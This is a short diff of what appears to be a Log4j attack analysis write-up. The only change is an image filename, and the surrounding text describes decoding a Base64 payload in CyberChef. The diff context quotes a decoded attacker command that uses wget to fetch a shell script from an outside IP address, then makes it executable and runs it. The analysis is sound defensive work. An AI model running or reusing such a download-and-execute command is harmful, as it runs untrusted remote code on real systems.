@@ -81,8 +81,7 @@ wget http://62.210.130.250/lh.sh ; chmod +x lh.sh; ./lh.sh
  
 This screenshot shows the decoding process in **CyberChef**, where the Base64-encoded string is transformed into a shell command. The output reveals the intent to download and execute a remote shell script, indicating a clear attempt at remote code execution.
 
-![CyberChef decoding Base64 payload](Screnshotslog4j/cyberchef.png)
-
+![CyberChef decoding Base64 payload](Screnshotslog4j/cyberchef_decode.png)
 
 
 **Interpretation:**
